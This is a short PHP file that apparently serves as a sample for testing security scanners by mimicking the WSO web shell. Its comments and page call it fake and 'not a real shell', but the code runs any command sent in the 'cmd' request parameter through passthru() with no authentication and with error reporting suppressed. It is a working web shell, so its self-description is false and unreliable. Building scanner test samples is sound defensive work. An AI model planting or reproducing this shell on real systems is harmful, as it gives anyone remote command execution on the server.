<?php
// HIVE Test Backdoor - wso.php
// This is a FAKE backdoor for security scanner testing
// Mimics WSO (Web Shell by oRb) patterns for scanner detection

$auth_pass = "wso";
$default_action = "FilesMan";
$color = "#df5";
$default_use_ajax = true;

@error_reporting(0);
@set_time_limit(0);
@ini_set('max_execution_time', 0);

function wsoLogin() {
    return true;
}

function wsoHeader() {
    echo "<html><head><title>WSO</title></head><body>";
}

function wsoFooter() {
    echo "</body></html>";
}

$shell_name = "WSO";
$shell_version = "2.5";

if(isset($_REQUEST['cmd'])) {
    echo "<pre>";
    $cmd = $_REQUEST['cmd'];
    passthru($cmd);
    echo "</pre>";
}
?>
<html>
<head><title>WSO Shell</title></head>
<body bgcolor="#1f1f1f" text="#df5">
<h1>WSO 2.5</h1>
<p>HIVE Test File - Not a real shell</p>
<form method="POST">
<input type="text" name="cmd" size="50" style="background:#1f1f1f;color:#df5;border:1px solid #df5;">
<input type="submit" value="Go" style="background:#df5;color:#1f1f1f;">
</form>
</body>
</html>
